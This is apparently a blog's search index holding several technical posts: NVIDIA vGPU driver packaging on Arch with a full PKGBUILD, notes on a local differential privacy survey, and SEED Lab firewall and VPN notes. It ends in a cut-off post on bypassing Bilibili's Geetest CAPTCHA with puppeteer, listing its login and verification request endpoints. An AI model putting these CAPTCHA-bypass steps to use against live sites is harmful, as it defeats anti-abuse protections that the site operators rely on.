中没有原来的显眼报错，而是 NVRM: RmInitAdapter failed!，肯定还是有问题了，nvidia-persistence 也无法启动的。\nDowngrade Kernel 查阅内网文档说是显卡驱动版本受限于母机，只支持到 450.102.04，那再手打 450xx 的包，结果发现安装 dkms 时总是编译报错，看 make.log 应该是内核源码中某些定义有变动，有类似的 patch https://bbs.archlinux.org/viewtopic.php?id=268421，但改了一个还没完，后面继续出现更多报错，短时间内估计搞不定，不如退而求其次，降 kernel 版本。\n根据 cuda-toolkit-release-notes 的 Table 3，450.102.04 对应 CUDA 11.0.3 Update 1，查看 cuda-installation-guide-linux v11.0.3，从表 Table 1. Native Linux Distribution Support in CUDA 11.0 推测官方最高支持到 Kernel 5.4.0，故降级到 linux-lts54，并 yay -S linux-lts54-headers\n安装 kernel 后重启前一定记得 grub-mkconfig，然后删除 /usr/lib/modules/ 下之前版本的残留文件夹，否则 dkms 仍会尝试编译该版本于是报错，未找到模块的错误 PKGBUILD 中再看是否可删除多余的命令，最后终于装成功，重启后 nvidia-smi 成功出现了梦寐以求的界面！\npython-pytorch-cuda 直接装，居然也 available 而不用装老版本，因为 cuda-toolkit-release-notes 的 Table 2 表明直到 CUDA 11.5 的 Minimum Required Driver Version 还是 \u0026gt;=450.80.02\ngridd 然而事情并没有那么简单，这样装上驱动后炼丹似乎完全没效果，这才想起来 vGPU 是需要 license 的，可装上后完全没有体现，因为我打包时压根没把 nvidia-gridd 放进去，于是打进包里，然后在 /etc/nvidia/gridd.conf 填入 license server address，启用服务后报错 Error requesting D-Bus name (Connection \u0026quot;:1.14\u0026quot; is not allowed to own the service \u0026quot;nvidia.grid.server\u0026quot; due to security policies in the configuration file)\n成功就在眼前，这个报错虽然非常小众，但问题依然能定位到 dbus配置，在 /usr/share/dbus-1/system.d 下创建 nvidia.grid.server.conf，写入如下配置：\n\u0026lt;!DOCTYPE busconfig PUBLIC \u0026quot;-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN\u0026quot; \u0026quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026quot;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;policy context=\u0026quot;default\u0026quot;\u0026gt; \u0026lt;allow own=\u0026quot;nvidia.grid.server\u0026quot;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;/busconfig\u0026gt;  果然不再报错，重启服务后显示成功获取，nvidia-smi -q | grep -i license 也证实了已变成 Licensed 状态。\nSummary 没有学会炼丹，却再次锻炼了折腾能力，最开始只会盲从 Arch Wiki，转折点是看到 /data 目录下的残留驱动而意识到应使用 vGPU 特供 grid 驱动，从而被迫学习改包打包，虽然成功打包并装上，但报错并发现到机器最高只支持 450xx，于是打旧包，这次是安装 dkms 总出错，从而对驱动和内核版本之间的关系有了更深理解，事后看 NVIDIA 官网的文档和表格大致明白了 Kernel, Driver, CUDA 这三者版本的关联。\n最后附上自制 nvidia-450xx-utils 的 PKGBUILD\n# Maintainer: Jonathon Fernyhough \u0026lt;jonathon+m2x+dev\u0026gt; # Contributor: Sven-Hendrik Haase \u0026lt;svenstaro@gmail.com\u0026gt; # Contributor: Thomas Baechler \u0026lt;thomas@archlinux.org\u0026gt; # Contributor: James Rayner \u0026lt;iphitus@gmail.com\u0026gt; pkgbase=nvidia-450xx-utils pkgname=('nvidia-450xx-utils' 'opencl-nvidia-450xx' 'nvidia-450xx-dkms') pkgver=450.102.04 pkgrel=2 arch=('x86_64') url=\u0026quot;http://www.nvidia.com/\u0026quot; license=('custom') options=('!strip') _pkg=\u0026quot;NVIDIA-Linux-x86_64-${pkgver}-grid\u0026quot; source=('nvidia-drm-outputclass.conf' 'nvidia-450xx-utils.sysusers' 'nvidia-450xx.rules' \u0026quot;https://storage.googleapis.com/nvidia-drivers-us-public/GRID/GRID11.3/${_pkg}.run\u0026quot;) sha512sums=('de7116c09f282a27920a1382df84aa86f559e537664bb30689605177ce37dc5067748acf9afd66a3269a6e323461356592fdfc624c86523bf105ff8fe47d3770' '4b3ad73f5076ba90fe0b3a2e712ac9cde76f469cd8070280f960c3ce7dc502d1927f525ae18d008075c8f08ea432f7be0a6c3a7a6b49c361126dcf42f97ec499' 'a0ceb0a6c240cf97b21a2e46c5c212250d3ee24fecef16aca3dffb04b8350c445b9f4398274abccdb745dd0ba5132a17942c9508ce165d4f97f41ece02b0b989' '523070e9e458f2da50df0f6dd35445ed824cf3b4ce2c3e191d58718a4ed638cfc644852b8330fb3da0444811431da7bf88f195e9aed1fa8615f92b8d1e941892') create_links() { # create soname links find \u0026quot;$pkgdir\u0026quot; -type f -name '*.so*' ! -path '*xorg/*' -print0 | while read -d $'\\0' _lib; do _soname=$(dirname \u0026quot;${_lib}\u0026quot;)/$(readelf -d \u0026quot;${_lib}\u0026quot; | grep -Po 'SONAME.*: \\[\\K[^]]*' || true) _base=$(echo ${_soname} | sed -r 's/(.*)\\.so.*/\\1.so/') [[ -e \u0026quot;${_soname}\u0026quot; ]] || ln -s $(basename \u0026quot;${_lib}\u0026quot;) \u0026quot;${_soname}\u0026quot; [[ -e \u0026quot;${_base}\u0026quot; ]] || ln -s $(basename \u0026quot;${_soname}\u0026quot;) \u0026quot;${_base}\u0026quot; done } prepare() { sh \u0026quot;${_pkg}.run\u0026quot; --extract-only cd \u0026quot;${_pkg}\u0026quot; bsdtar -xf nvidia-persistenced-init.tar.bz2 cd kernel sed -i \u0026quot;s/__VERSION_STRING/${pkgver}/\u0026quot; dkms.conf sed -i 's/__JOBS/`nproc`/' dkms.conf sed -i 's/__DKMS_MODULES//' dkms.conf sed -i '$iBUILT_MODULE_NAME[0]=\u0026quot;nvidia\u0026quot;\\ DEST_MODULE_LOCATION[0]=\u0026quot;/kernel/drivers/video\u0026quot;\\ BUILT_MODULE_NAME[1]=\u0026quot;nvidia-uvm\u0026quot;\\ DEST_MODULE_LOCATION[1]=\u0026quot;/kernel/drivers/video\u0026quot;\\ BUILT_MODULE_NAME[2]=\u0026quot;nvidia-modeset\u0026quot;\\ DEST_MODULE_LOCATION[2]=\u0026quot;/kernel/drivers/video\u0026quot;\\ BUILT_MODULE_NAME[3]=\u0026quot;nvidia-drm\u0026quot;\\ DEST_MODULE_LOCATION[3]=\u0026quot;/kernel/drivers/video\u0026quot;' dkms.conf # Gift for linux-rt guys sed -i 's/NV_EXCLUDE_BUILD_MODULES/IGNORE_PREEMPT_RT_PRESENCE=1 NV_EXCLUDE_BUILD_MODULES/' dkms.conf } package_opencl-nvidia-450xx() { pkgdesc=\u0026quot;OpenCL implemention for NVIDIA\u0026quot; depends=('zlib') optdepends=('opencl-headers: headers necessary for OpenCL development') provides=('opencl-driver' 'opencl-nvidia') conflicts=('opencl-nvidia') cd \u0026quot;${_pkg}\u0026quot; # OpenCL install -Dm644 nvidia.icd \u0026quot;${pkgdir}/etc/OpenCL/vendors/nvidia.icd\u0026quot; install -D \u0026quot;libnvidia-compiler.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-compiler.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-opencl.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-opencl.so.${pkgver}\u0026quot; create_links mkdir -p \u0026quot;${pkgdir}/usr/share/licenses\u0026quot; ln -s nvidia-utils \u0026quot;${pkgdir}/usr/share/licenses/opencl-nvidia\u0026quot; } package_nvidia-450xx-dkms() { pkgdesc=\u0026quot;NVIDIA drivers - module sources\u0026quot; depends=('dkms' \u0026quot;nvidia-450xx-utils=$pkgver\u0026quot; 'libglvnd') provides=('NVIDIA-MODULE') cd ${_pkg} install -dm 755 \u0026quot;${pkgdir}\u0026quot;/usr/src cp -dr --no-preserve='ownership' kernel \u0026quot;${pkgdir}/usr/src/nvidia-${pkgver}\u0026quot; install -Dt \u0026quot;${pkgdir}/usr/share/licenses/${pkgname}\u0026quot; -m644 \u0026quot;${srcdir}/${_pkg}/LICENSE\u0026quot; } package_nvidia-450xx-utils() { pkgdesc=\u0026quot;NVIDIA drivers utilities\u0026quot; depends=('xorg-server') optdepends=('xorg-server-devel: nvidia-xconfig' 'opencl-nvidia-450xx: OpenCL support') conflicts=('nvidia-libgl' 'nvidia-utils') provides=('vulkan-driver' 'opengl-driver' 'nvidia-libgl' 'nvidia-utils') install=\u0026quot;${pkgname}.install\u0026quot; cd \u0026quot;${_pkg}\u0026quot; # Check http://us.download.nvidia.com/XFree86/Linux-x86_64/${pkgver}/README/installedcomponents.html # for hints on what needs to be installed where. # X driver install -D nvidia_drv.so \u0026quot;${pkgdir}/usr/lib/xorg/modules/drivers/nvidia_drv.so\u0026quot; # GLX extension module for X install -D \u0026quot;libglxserver_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/nvidia/xorg/libglxserver_nvidia.so.${pkgver}\u0026quot; # Ensure that X finds glx ln -s \u0026quot;libglxserver_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/nvidia/xorg/libglxserver_nvidia.so.1\u0026quot; ln -s \u0026quot;libglxserver_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/nvidia/xorg/libglxserver_nvidia.so\u0026quot; install -D \u0026quot;libGLX_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libGLX_nvidia.so.${pkgver}\u0026quot; # OpenGL libraries install -D \u0026quot;libEGL_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libEGL_nvidia.so.${pkgver}\u0026quot; install -D \u0026quot;libGLESv1_CM_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libGLESv1_CM_nvidia.so.${pkgver}\u0026quot; install -D \u0026quot;libGLESv2_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libGLESv2_nvidia.so.${pkgver}\u0026quot; install -Dm644 \u0026quot;10_nvidia.json\u0026quot; \u0026quot;${pkgdir}/usr/share/glvnd/egl_vendor.d/10_nvidia.json\u0026quot; # OpenGL core library install -D \u0026quot;libnvidia-glcore.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-glcore.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-eglcore.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-eglcore.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-glsi.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-glsi.so.${pkgver}\u0026quot; # misc install -D \u0026quot;libnvidia-ifr.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ifr.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-fbc.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-fbc.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-encode.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-encode.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-cfg.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-cfg.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-ml.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ml.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-glvkspirv.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-glvkspirv.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-allocator.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-allocator.so.${pkgver}\u0026quot; # Vulkan ICD install -Dm644 \u0026quot;nvidia_icd.json\u0026quot; \u0026quot;${pkgdir}/usr/share/vulkan/icd.d/nvidia_icd.json\u0026quot; install -Dm644 \u0026quot;nvidia_layers.json\u0026quot; \u0026quot;${pkgdir}/usr/share/vulkan/implicit_layer.d/nvidia_layers.json\u0026quot; # VDPAU install -D \u0026quot;libvdpau_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/vdpau/libvdpau_nvidia.so.${pkgver}\u0026quot; # nvidia-tls library install -D \u0026quot;libnvidia-tls.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-tls.so.${pkgver}\u0026quot; # CUDA install -D \u0026quot;libcuda.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libcuda.so.${pkgver}\u0026quot; install -D \u0026quot;libnvcuvid.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvcuvid.so.${pkgver}\u0026quot; # PTX JIT Compiler (Parallel Thread Execution (PTX) is a pseudo-assembly language for CUDA) install -D \u0026quot;libnvidia-ptxjitcompiler.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ptxjitcompiler.so.${pkgver}\u0026quot; # raytracing install -D \u0026quot;libnvoptix.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvoptix.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-rtcore.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-rtcore.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-cbl.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-cbl.so.${pkgver}\u0026quot; # NGX install -D \u0026quot;libnvidia-ngx.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ngx.so.${pkgver}\u0026quot; # Optical flow install -D \u0026quot;libnvidia-opticalflow.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-opticalflow.so.${pkgver}\u0026quot; # Only for GRID, maybe useless install -D \u0026quot;libFlxCore64.so.2018.02\u0026quot; \u0026quot;${pkgdir}/usr/lib/libFlxCore64.so.2018.02\u0026quot; install -D \u0026quot;libFlxComm64.so.2018.02\u0026quot; \u0026quot;${pkgdir}/usr/lib/libFlxComm64.so.2018.02\u0026quot; # DEBUG install -D nvidia-debugdump \u0026quot;${pkgdir}/usr/bin/nvidia-debugdump\u0026quot; # nvidia-xconfig install -D nvidia-xconfig \u0026quot;${pkgdir}/usr/bin/nvidia-xconfig\u0026quot; install -Dm644 nvidia-xconfig.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-xconfig.1.gz\u0026quot; # nvidia-settings install -D -m755 nvidia-settings \u0026quot;${pkgdir}/usr/bin/nvidia-settings\u0026quot; install -D -m644 nvidia-settings.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-settings.1.gz\u0026quot; install -D -m644 nvidia-settings.desktop \u0026quot;${pkgdir}/usr/share/applications/nvidia-settings.desktop\u0026quot; install -D -m644 nvidia-settings.png \u0026quot;${pkgdir}/usr/share/pixmaps/nvidia-settings.png\u0026quot; install -D -m755 \u0026quot;libnvidia-gtk2.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-gtk2.so.${pkgver}\u0026quot; install -D -m755 \u0026quot;libnvidia-gtk3.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-gtk3.so.${pkgver}\u0026quot; sed -e 's:__UTILS_PATH__:/usr/bin:' -e 's:__PIXMAP_PATH__:/usr/share/pixmaps:' -i \u0026quot;${pkgdir}/usr/share/applications/nvidia-settings.desktop\u0026quot; # nvidia-bug-report install -D nvidia-bug-report.sh \u0026quot;${pkgdir}/usr/bin/nvidia-bug-report.sh\u0026quot; # nvidia-smi install -D nvidia-smi \u0026quot;${pkgdir}/usr/bin/nvidia-smi\u0026quot; install -Dm644 nvidia-smi.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-smi.1.gz\u0026quot; # nvidia-cuda-mps install -D nvidia-cuda-mps-server \u0026quot;${pkgdir}/usr/bin/nvidia-cuda-mps-server\u0026quot; install -D nvidia-cuda-mps-control \u0026quot;${pkgdir}/usr/bin/nvidia-cuda-mps-control\u0026quot; install -Dm644 nvidia-cuda-mps-control.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-cuda-mps-control.1.gz\u0026quot; # nvidia-modprobe # This should be removed if nvidia fixed their uvm module! install -Dm4755 nvidia-modprobe \u0026quot;${pkgdir}/usr/bin/nvidia-modprobe\u0026quot; install -Dm644 nvidia-modprobe.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-modprobe.1.gz\u0026quot; # nvidia-persistenced install -D nvidia-persistenced \u0026quot;${pkgdir}/usr/bin/nvidia-persistenced\u0026quot; install -Dm644 nvidia-persistenced.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-persistenced.1.gz\u0026quot; install -Dm644 nvidia-persistenced-init/systemd/nvidia-persistenced.service.template \u0026quot;${pkgdir}/usr/lib/systemd/system/nvidia-persistenced.service\u0026quot; sed -i 's/__USER__/nvidia-persistenced/' \u0026quot;${pkgdir}/usr/lib/systemd/system/nvidia-persistenced.service\u0026quot; # nvidia-gridd install -Dm4755 nvidia-gridd \u0026quot;${pkgdir}/usr/bin/nvidia-gridd\u0026quot; install -Dm644 nvidia-gridd.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-gridd.1.gz\u0026quot; install -Dm644 gridd.conf.template \u0026quot;${pkgdir}/etc/nvidia/gridd.conf.template\u0026quot; install -Dm644 init-scripts/systemd/nvidia-gridd.service \u0026quot;${pkgdir}/usr/lib/systemd/system/nvidia-gridd.service\u0026quot; # application profiles install -Dm644 nvidia-application-profiles-${pkgver}-rc \u0026quot;${pkgdir}/usr/share/nvidia/nvidia-application-profiles-${pkgver}-rc\u0026quot; install -Dm644 nvidia-application-profiles-${pkgver}-key-documentation \u0026quot;${pkgdir}/usr/share/nvidia/nvidia-application-profiles-${pkgver}-key-documentation\u0026quot; install -Dm644 LICENSE \u0026quot;${pkgdir}/usr/share/licenses/nvidia-utils/LICENSE\u0026quot; install -Dm644 README.txt \u0026quot;${pkgdir}/usr/share/doc/nvidia/README\u0026quot; install -Dm644 NVIDIA_Changelog \u0026quot;${pkgdir}/usr/share/doc/nvidia/NVIDIA_Changelog\u0026quot; cp -r html \u0026quot;${pkgdir}/usr/share/doc/nvidia/\u0026quot; ln -s nvidia \u0026quot;${pkgdir}/usr/share/doc/nvidia-utils\u0026quot; install -Dm644 \u0026quot;${srcdir}/nvidia-450xx-utils.sysusers\u0026quot; \u0026quot;${pkgdir}/usr/lib/sysusers.d/$pkgname.conf\u0026quot; install -Dm644 \u0026quot;${srcdir}/nvidia-450xx.rules\u0026quot; \u0026quot;$pkgdir\u0026quot;/usr/lib/udev/rules.d/60-nvidia-450xx.rules # distro specific files must be installed in /usr/share/X11/xorg.conf.d install -m755 -d \u0026quot;$pkgdir/usr/share/X11/xorg.conf.d\u0026quot; install -Dm644 \u0026quot;${srcdir}/nvidia-drm-outputclass.conf\u0026quot; \u0026quot;${pkgdir}/usr/share/X11/xorg.conf.d/10-nvidia-drm-outputclass.conf\u0026quot; echo \u0026quot;blacklist nouveau\u0026quot; | install -Dm644 /dev/stdin \u0026quot;${pkgdir}/usr/lib/modprobe.d/${pkgname}.conf\u0026quot; echo \u0026quot;nvidia-uvm\u0026quot; | install -Dm644 /dev/stdin \u0026quot;${pkgdir}/usr/lib/modules-load.d/${pkgname}.conf\u0026quot; create_links }  ","date":"2022-01-17T15:03:15+08:00","permalink":"https://chinggg.github.io/post/vps2arch-nvidia/","tags":["",""],"title":"vps2arch NVIDIA vGPU"},{"categories":["论文"],"contents":"A survey of local differential privacy for securing internet of vehicles\nIntro IoV facilitates human’s life but benefits come with huge price of data privacy.\nIn academia, differential privacy (DP) is proposed and regarded as an extremely strong privacy standard, which formalizes both the degree of privacy preservation and data utility.\nBut DP suffers from a drawback in many practical scenarios because the paradigm of DP relies on a third party.\nLDP has the potential to guarantee the data privacy in IoV, the third party does not collect the exact data of each individual, and yet still be able to compute the correct statistical results.\nContributions of this paper:\n first to survey existing work about LDP in terms of advantages, disadvantages, computation complexity, and the privacy budget first to investigate the potential applications of LDP in securing IoV and highlight the new challenges  LDP researches Data publication Data publication based on local differential privacy mainly uses non-interactive framework to release statistical information of sensitive data and enables the released data to meet the needs of data analysis at the same time. Commonly used data publication technologies mainly include histogram, partitioning, and sampling filter.\nThe earliest research RAPPOR proposed to collect crowd-sourced statistics from users’ data without violating users’ data privacy, but it has two disadvantages:\n high communication cost between users and the data collector data collector is required to collect candidate string lists in advance for frequency statistics  To reduce the communication overhead, S-Hist proposed to randomly select bits using randomized response techniques to perturb users’ data and send the perturbed data to the collector.\nTo deal with the second drawback of RAPPOR, the second drawback of RAPPOR, O-RAPPOR based on the unknown values of variables and designed hash mapping and grouping operations.\nMachine Learning The main idea of LDP-based machine learning is that users locally perturb parameter updates of machine learning on their vehicle data using LDP and the server gets the global parameter updates via collecting local parameter updates from users.\nRegression analysis based on LDP is another research topic. Regression analysisis a commonly used data classification method in machine learning, which determines the quantitative relationship of two or more attributes in the input datasets. Regression analysis consists of two kinds of functions: One is the prediction function; the other is the objective function, or the risk function. It will leak the prediction function and the data information in the datasets when publishing the weight vector. To protect such data privacy in machine learning, a variety of work has applied LDP to regression analysis.\nWhether add noise to weight vector or objective function, the cost of calculating the sensitivity of the weight vector is still high.\nTo address the problems above, FM (functional mechanism) was proposed, which achieved the regression analysis while meeting local differential privacy. FM first perturbed the sum of objective functions corresponding to each data tuple in the datasets and then obtained the weight vector by minimizing the target function. In this process, the noise scale is not determined by the sensitivity of the weight vector, but by expressing the objective function as a polynomial, avoiding the computation of the sensitivity of the weight vector.\nIn summary, the SVM classification based on Laplace has low classification accuracy and larger noise, while SVM classification based on perturbing objective functions is only applicable to specific objective functions. Therefore, how to design a perturbation mechanism with high precision and applications to multiple objective functions is the future research topic.\nQuery processing The query processing technologies based on local differential privacy mainly focus on how to respond to queries with less privacy budget and lower error.\nFor example, linear queries in the interactive framework, batch processing of linear queries includes matrix mechanisms and low-rank mechanisms.\nAnother kind of work focused on process users’ queries based on division methods.\nIn summary, the matrix mechanism is prone to suboptimal results in practice; the low-rank mechanism only considers the correlation of the load matrix and does not take into account the relevance of the data itself. Therefore, how to design a general batch query processing mechanism from the actual relevance of the data itself is a future research direction.\nApplication of LDP system Frank et al. first introduced the local differential privacy method to the recommendation system. They assumed that the recommendation system is not trusted. The attacker can estimate the user’s private information by analyzing the historical data of the recommendation system. So it is necessary to interfere with the input of the recommended system. When analyzing the relationship between projects, they first establish a project similarity covariance matrix and add Laplace noise to the matrix to implement interference, and then submit it to the recommendation system to implement the conventional recommendation algorithm.\nApplications of LDP in IoV We first introduce the attack models in IoV and then investigate the potential applications of LDP in several typical scenarios in IoV.\nAttack model in IoV   Malicious vehicle. On the one hand, they may deliberately disclose vehicles’ data to advertisers, illegal organizations. On the other hand, they may collude with others, send poisoning data, deliberately drop out during the process of completing IoV services, etc., aiming to disclosing other users’ data privacy or paralyzing the IoV systems.\n  Malicious server. Specifically, malicious server may be passive or active adversary. The passive adversary is curious about users’ data, but it honestly performs the protocols. In contrast, the active adversary may tamper the protocols or actively launch attacks to disclose users’ data privacy.\n  Query services in IoV A number of techniques have been proposed to protect users’ data privacy in academia.\nSpecifically, rule protocol-based privacy-preserving techniques are first proposed. However, it is high overhead for server to obtain vehicles’ authorization before utilizing vehicles’ data in IoV, because of the unique features vehicles exhibit, e.g., high mobility, short connection times, etc.\nEncryption techniques allow the server to collect and process the encrypted data of vehicles. Nevertheless, it is not applicable to large amounts of vehicles’ data due to the extremely high computation overhead.\nHeuristic algorithms, e.g., dummy, k-anonymity, pseudonym, cloaking, m-invariance, etc., are quite lightweight compared to encryption techniques. But all these heuristic algorithms are vulnerable to the side information-based attacks.\nIn summary, LDP that is relatively lightweight and thoroughly considers side information of attackers is promised to protect vehicles’ data privacy in query services in IoV.\nCrowdsourcing in IoV Many existing work has focused on protecting data privacy in crowdsourcing. Work [114] introduces a third party, the cloud, that is responsible for storage and computation burden. Study [115] proposed a general feedback-based k-anonymity scheme to cloak users’ data. The literature [116] utilized a random perturbation to mask users’ data and employed the error-correcting codes to guarantee data utility. However, all these existing work ignores the side information of attackers and therefore is susceptible to side information-based attacks. Furthermore, these work is not applicable to the data privacy preservation in IoV, as density of vehicles is varying, and vehicles move with high speed and can only be connected in short time.\nIn such a case, LDP is applicable to protect vehicle users’ data privacy in crowdsourcing applications in IoV, as it thoroughly considers the available side information of attackers and is a lightweight privacy-preserving method.\nFuture research opportunities In IoV, the complexity, diversity, and large-scale nature of vehicle data will add new data privacy risks. Therefore, we believe that LDP will face many new challenges：\n LDP for complex data types in IoV. At present, the research of LDP mainly focused on simple data types, e.g., frequency statistics or mean value statistics on set-valued data that only contains one attribute. However, in IoV, the structural characteristics of vehicle data make the global query sensitivity extremely high and bring in excessive noise. LDP for various query and analysis tasks in IoV. At present, the existing work about LDP only investigated the privacy preservation in the two types of simple aggregate queries, i.e., counting queries of the discrete data and mean queries of the continuous data. Furthermore, the way of data perturbation is generally depended on the types of queries. In IoV, a variety of query services are provided, and thus, LDP faces many new challenges. High-dimensional vehicle data publication based on LDP. In IoV, the set-valued data contains many attributes, and the existing studies about LDP will not work, as they only focused on simple data types. Improvements in the LDP model for IoV. In practice, the value of the privacy-preserving parameter 휖 still does not have a standard. Although the physical meaning of parameters in k-anonymity and l-diversity is intuitive, the privacy preservation provided by 휖-differential privacy is relatively vague, which indicates that the problem is still up in the air. Considering correlations among vehicle data with LDP. Local differential privacy assumes that vehicle data are independent of each other, i.e., ignoring the correlations among vehicle data. However, in practice, vehicle data may be dependent. Combinations the LDP model with other techniques, e.g., machine learning, AI, and so on. AI techniques are expected to provide potential solutions to, e.g., smart city, intelligent transportation, travel route recommendation, environment monitoring, air quality navigation, map navigation, etc., in IoV.  ","date":"2022-01-13T21:20:48+08:00","permalink":"https://chinggg.github.io/post/ldp-iov/","tags":["论文笔记","安全","隐私保护"],"title":"Local Differential Privacy for IoV"},{"categories":["安全"],"contents":"SEED Labs 2.0 - Network Security Firewall 使用 NetFilter 自制防火墙 LKM Netfilter 是 Linux 内核中一个用于管理网络数据包的软件框架，可以使用它自制 Linux Kernel Module，实现简易的防火墙。\nTask1 只是练习如何编译内核模块，即在 module_init(fn), module_exit(fn) 处初始化及退出。\n使用 Netfilter 搭建防火墙的步骤：\n 定义 nf_hook_ops 结构体，给 hook(hook函数) 和 hooknum(hook点类型) 赋值  struct nf_hook_ops { /* User fills in from here down. */ nf_hookfn\t*hook; struct net_device\t*dev; void\t*priv; u8\tpf; enum nf_hook_ops_type\thook_ops_type:8; unsigned int\thooknum; /* Hooks are ordered in ascending priority. */ int\tpriority; };    模块加载时 nf_register_net_hook(\u0026amp;init_net, \u0026amp;hook1)，卸载时 nf_unregister_net_hook(\u0026amp;init_net, \u0026amp;hook1)\n  nf_hookfn 函数签名如下，实验中只需 ip_hdr(skb) 获得 iphdr 结构体（类似有 tcphdr/udphdr），再从 iph 获得协议类型、源/目标地址，从 tcph/udph 获得端口号，比较决定是否 DROP 即可。\n  typedef unsigned int nf_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);   注意每个结构体只能赋值一个 hooknum，想在多个点上 hook 需定义多个 nf_hook_ops，分别设置不同的 hooknum，枚举类型如下：  enum nf_inet_hooks { NF_INET_PRE_ROUTING, NF_INET_LOCAL_IN, NF_INET_FORWARD, NF_INET_LOCAL_OUT, NF_INET_POST_ROUTING, NF_INET_NUMHOOKS, NF_INET_INGRESS = NF_INET_NUMHOOKS, };  使用 iptables 基本命令 iptables -A {chain} -j {rule}，-i/o {dev} 指定入/出接口，-s/d 指定源/目标地址，-sport/dport 指定源/目标端口\n对于 TCP 连接，使用 conntrack 模块搭建有状态防火墙，只允许已经建立的 TCP 连接和内部发起新连接\n限流使用 limit 模块，--limit 指定设置最大频率（即如10次/分钟），--limit-burst 指定最大连续次数\n负载均衡使用 statistic 模块，--mode 指定模式为 random 或 nth，random 模式下 --probability 指定概率，nth 模式下 --every n 指定轮转周期，--packet p 指定初始计数值（即从[0,n-1]中某处开始计数），一般配合 -j DNAT --to-destination {ip:port} 使用\nVPN_Tunnel 实验基于 TUN/TAP 技术，TUN 模拟网络层设备，TAP 模拟数据链路层设备，用户程序和操作系统可以通过 TUN/TAP 接口互相传递数据包。\nClient Program send(ip) -\u0026gt; Client TUN read(ip) -\u0026gt; Client Socket send(udp/ip) -\u0026gt; Server Socket recv(udp/ip) -\u0026gt; Server TUN write(ip) -\u0026gt; ... route to dst then got reply routed back ... Server TUN read(ip) -\u0026gt; Server Socket send(udp/ip) -\u0026gt; Client Socket recv(udp/ip) -\u0026gt; Client TUN write(ip) -\u0026gt; Client Program recv(ip)  参考文献  https://arthurchiao.art/blog/deep-dive-into-iptables-and-netfilter-arch-zh/ ","date":"2022-01-07T20:57:24+08:00","permalink":"https://chinggg.github.io/post/seed-network/","tags":["实验"],"title":"SEEDLab Network"},{"categories":["安全"],"contents":"字符型验证码 SimGAN-Captcha代码阅读与复现 关于SimGAN-Captcha的扩展实验 全都得死：GAN掉字符验证码\n小试牛刀 先尝试模拟，使用 puppteer 稍加计算就能成功绕过极验\n请求依次为\n POST https://passport.bilibili.com/x/passport-login/sms/send 设备信息为 body，返回 recaptcha_url 随即向其发起请求，注意该 url 中的 gt 和 challenge 将用于后续一系列请求 GET https://www.bilibili.com/h5/project-msg-auth/verify?ct=geetest\u0026amp;recaptcha_token=\u0026amp;gee_gt=\u0026amp;gee_challenge=\u0026amp;hash= 即向之前获得的 recaptcha_url 发送 GET 请求跳转到页面 GET https://api.geetest.com/gettype.php?gt=\u0026amp;callback=geetest_{13位毫秒时间戳} 